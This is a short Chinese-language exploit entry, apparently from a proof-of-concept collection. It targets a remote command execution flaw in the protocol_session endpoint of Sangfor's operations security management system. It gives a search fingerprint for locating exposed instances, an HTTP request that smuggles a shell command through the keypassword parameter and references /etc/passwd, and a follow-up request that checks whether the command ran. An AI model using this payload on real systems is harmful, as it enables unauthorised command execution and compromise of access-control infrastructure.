# 深信服运维安全管理系统protocol_session存在远程命令执行漏洞

- **系统**：深信服　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/fort/login"`
- **请求**：`GET /isomp-protocol/protocol/session?keyPath=/etc/passwd&protocol=ssh&keypassword=123456%27%3Bid+%3E%20/usr/local/tomcat/webapps/fort/trust/version/T1.txt;&sshd=1 HTTP/1.1`

**请求体 / payload**
```
验证路径
GET /fort/trust/version/T1.txt HTTP/1.1
Host:
```
- **预期**：200　|　—